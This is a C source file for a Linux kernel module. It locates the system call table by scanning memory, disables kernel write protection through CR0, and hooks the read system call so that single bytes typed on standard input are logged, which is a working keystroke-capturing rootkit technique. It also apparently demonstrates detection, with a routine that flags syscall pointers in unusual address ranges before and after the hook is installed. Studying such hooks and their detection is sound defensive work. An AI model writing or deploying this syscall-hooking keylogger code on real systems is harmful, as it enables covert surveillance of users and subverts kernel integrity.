#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>

unsigned long **sys_call_table;
unsigned long original_cr0;

static unsigned long **get_sys_call_table(void)
{
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **table;

    while (offset < ULLONG_MAX) {
        table = (unsigned long **)offset;

        if (table[__NR_close] == (unsigned long *) sys_close) 
            return table;

        offset += sizeof(void *);
    }
    
    return NULL;
}

asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
    long ret;
    ret = ref_sys_read(fd, buf, count);

    if(count == 1 && fd == 0)
        printk(KERN_INFO "intercept: 0x%02X", buf[0]);

    return ret;
}

static int add_hook(void) 
{
    if(!(sys_call_table = get_sys_call_table()))
        return -1;
    
    original_cr0 = read_cr0();

    write_cr0(original_cr0 & ~0x00010000);
    ref_sys_read = (void *)sys_call_table[__NR_read];
    sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
    write_cr0(original_cr0);
    
    return 0;
}

static void remove_hook(void) 
{
    if(!sys_call_table) {
        return;
    }
    
    write_cr0(original_cr0 & ~0x00010000);
    sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
    write_cr0(original_cr0);
    
    msleep(2000);
}

static int verify_syscall_table(void)
{
    int err = 0;
    unsigned long ptr;
    int i;

    if(!(sys_call_table = get_sys_call_table()))
        return -1;

    printk(KERN_INFO "sys_call_table: 0x%p", sys_call_table);

    printk(KERN_INFO "sys_call_table read function -> %p", (void *)sys_call_table[__NR_read]);


    for (i=0; i <= __NR_syscall_max; i++) {
        ptr = (unsigned long)sys_call_table[i];
        //0xffffffffa0348000
        if ( (ptr <= 0xffffffff80000000) || (ptr >= 0xffffffffa0000000) ) {
            printk(KERN_INFO "Found a syscall pointer referencing an unusual location");
            printk(KERN_INFO "sys_call_table[%d]->[0x%p]", i, (void *)sys_call_table[i]);
            err = 1;
        }
    }

    if (!err) {
        printk(KERN_INFO "No issues found in syscall table");
    }

    return 0;
}

static int __init begin(void) 
{

    // Check the clean table
    verify_syscall_table();

    // Add a syscall hook
    add_hook();

    // Check the dorked table
    verify_syscall_table();

    return 0;
}

static void __exit end(void)
{
    remove_hook();
}

module_init(begin);
module_exit(end);

MODULE_LICENSE("Proprietary");

